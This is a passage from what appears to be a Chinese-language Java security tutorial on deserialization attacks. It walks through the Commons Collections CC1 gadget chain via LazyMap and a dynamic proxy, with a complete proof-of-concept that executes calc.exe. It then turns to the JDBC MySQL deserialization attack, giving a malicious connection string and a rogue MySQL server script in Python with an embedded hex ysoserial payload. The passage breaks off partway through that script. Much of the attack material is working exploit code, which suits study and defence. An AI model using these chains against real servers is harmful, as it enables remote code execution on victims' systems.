class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建Java对象序列化输出流对象</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化AnnotationInvocationHandler类</span></span><br><span class="line">            out.writeObject(instance);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取序列化的二进制数组</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出序列化的二进制数组</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Payload攻击字节数组：&quot;</span> + Arrays.toString(bytes));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 模拟远程的反序列化过程</span></span><br><span class="line">            in.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭ObjectInputStream输入流</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h5><p>看到这里，你会发现，不对啊，<code>ysoserial</code>里面是<code>LazyMap</code>，而我们却没有讲到，这里讲一下</p>
<p>有师傅分析<code>LazyMap</code>类，里面的<code>get</code>方法正好符合<code>put</code>去调用<code>transform</code>的情况</p>
<blockquote>
<p>get方法同时还要求传入一个Object 参数，get方法内部在调用transform方法之前会先判断一下key，如果当前map中不存在key的话，则通过factory来创建一个value</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，因为factory是LazyMap类的成员属性，其数据类型也是Transformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/** Serialization version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/** The factory to use to construct elements */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure>

<p>同时还具有我们熟悉的<code>decorate</code>方法，这个方法和之前TransformedMap中的decorate方法的用法一样，它要求接收两个参数，一个是Map，另一个是Transformer类型的factory，这意味着factory参数是可控的，我们可以通过反射或者构造方法来控制factory参数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>LazyMap类的利用链问题解决了，但还需要一个类在反序列化的时候触发LazyMap类的get方法，因此还得借助AnnotationInvocationHandler类，通过AnnotationInvocationHandler类的构造方法将LazyMap传递给memberValues，也就是说我们要获得AnnotationInvocationHandler的构造器。</p>
<p>这里我们以<code>invoke()</code>方法做例子</p>
<p>其中&#x3D;&#x3D;invoke&#x3D;&#x3D;的关键函数是，可以看到invoke方法中有一个memberValues调用了get方法，memberValues的值是可控的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="如何调用AnnotationInvocationHandler类中的invoke方法"><a href="#如何调用AnnotationInvocationHandler类中的invoke方法" class="headerlink" title="如何调用AnnotationInvocationHandler类中的invoke方法"></a>如何调用AnnotationInvocationHandler类中的invoke方法</h6><p>答案就是：<strong>通过反射将代理对象proxyMap传给AnnotationInvocationHandler的构造方法</strong></p>
<h6 id="代理对象"><a href="#代理对象" class="headerlink" title="代理对象"></a>代理对象</h6><p>通过分析AnnotationInvocationHandler类，发现这个类实现了InvocationHandler接口，是动态代理的接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>参数loader表示目标对象所属类的加载器，因此这里要传入Map的类加载器</p>
</li>
<li><p>参数interfaces表示目标对象实现的接口（通过反射获取），也就是目标对象lazyMap实现的接口，这里还是传入Map对象</p>
</li>
<li><p>参数h表示代理类要完成的功能，注意参数h的类型时InvocationHandler，因此这里我们要传入AnnotationInvocationHandler对象</p>
</li>
</ul>
<p>具体的话参考此<a href="https://blog.csdn.net/u012326462/article/details/81293186">https://blog.csdn.net/u012326462/article/details/81293186</a></p>
<p>在Spring里面，逐渐演化为AOP思想</p>
<p>既然我们的目标是调用LazyMap类的get方法，那么可以通过Proxy类的静态方法newProxyInstance来创建LazyMap类的动态代理对象，当lazyMap调用方法时就会调用代理对象的invoke方法。</p>
<h6 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h6><p>通过调试，AnnotationInvocationHandler的构造会将代理对象proxyMap赋值给成员属性memberValues </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后AnnotationInvocationHandler对象在反序列化的时候调用重写的readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="comment">//获取LazyMap父类的entrySet</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="comment">//代理对象调用方法</span></span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	当调用readObject方法时，memberValues的值就是代理对象proxyMap（也就是LazyMap的代理对象），只要代理对象proxyMap调用方法就会执行AnnotationInvocationHandler中的invoke方法（代理对象调用任何方法In，不管vocationHandler的invoke方法都会进行拦截，这就是动态代理技术）</p>
<p>所以，我们可以构造为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);</span><br><span class="line">        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(annotationInvocationHandler);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="思路图"><a href="#思路图" class="headerlink" title="思路图"></a>思路图</h6><p><img src="https://img-blog.csdnimg.cn/20210720151853616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70" alt="img"></p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><ol>
<li><p>LazyMap链的触发点不应该是 this.memberValues.entrySet() 吗？然而调试发现并不是从这个断点进入的命令执行，而是从 (Entry)var4.next() 方法进入的</p>
</li>
<li><p>TransformedMap链的HashMap实例需要存在value键，否则无法通过 <code>if (var7 != null)</code> 条件，具体为什么HashMap的键值对应着AbstractInputCheckedMapDecorator.MapEntry的键值</p>
</li>
</ol>
<h1 id="java安全入门-三"><a href="#java安全入门-三" class="headerlink" title="java安全入门(三)"></a>java安全入门(三)</h1><p>对于使用<code>java</code>各种组件的项目，如果所使用的组件本身就存在漏洞，那么大部分实在因为在参数传递的时候收到了污染，而下列介绍的这一种，则是相对于在协议层面上的利用。</p>
<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><blockquote>
<p>Java数据库连接，（Java Database Connectivity，简称JDBC）是<a href="https://baike.baidu.com/item/Java%E8%AF%AD%E8%A8%80">Java语言</a>中用来规范客户端程序如何来访问数据库的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3/10418844">应用程序接口</a>，提供了诸如查询和更新数据库中数据的方法</p>
</blockquote>
<p>简单来说，你可以理解为 <code>JDBC</code>是封装好的数据库接口，你可以直接使用<code>java</code>调用该组件的接口，他把数据库的协议封装好了，让你无需对协议进行理解即可使用。</p>
<blockquote>
<p>封装也是java的特性之一，，，mysql，mssql，oracle…—&gt;JDBC—&gt;Mybatis—-&gt;Mybatis plus</p>
</blockquote>
<p>除了JDBC外，还有<code>JNDI(Java Naming and Directory Interface,Java命名和目录接口)(下节课讲)：LDAP,RMI,JRMP</code>，SOAP, JMS ，JTA ，JWT等等，都是JAVA在开发中常用的协议</p>
<h2 id="JDBC反序列化漏洞"><a href="#JDBC反序列化漏洞" class="headerlink" title="JDBC反序列化漏洞"></a>JDBC反序列化漏洞</h2><p>这是2019年黑帽大会的一个议题，详细可以查看</p>
<p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf</a></p>
<p>该漏洞需要能够控制客户端的JDBC连接字符串，在连接阶段即可触发，无需执行SQL语句</p>
<p>我们可以编写这样的demo进行测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        System.out.println(conn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解释一下JDBC连接时候所使用的几个参数</p>
<ul>
<li>autoDeserialize：自动检测与反序列化存在BLOB字段中的对象；</li>
<li>statementInterceptors：开发在调试sql语句的时候会使用拦截器来进行调试，这里使用ServerStatusDiffInterceptor</li>
</ul>
</blockquote>
<p>其中mysql的版本使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们贴上师傅写的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span 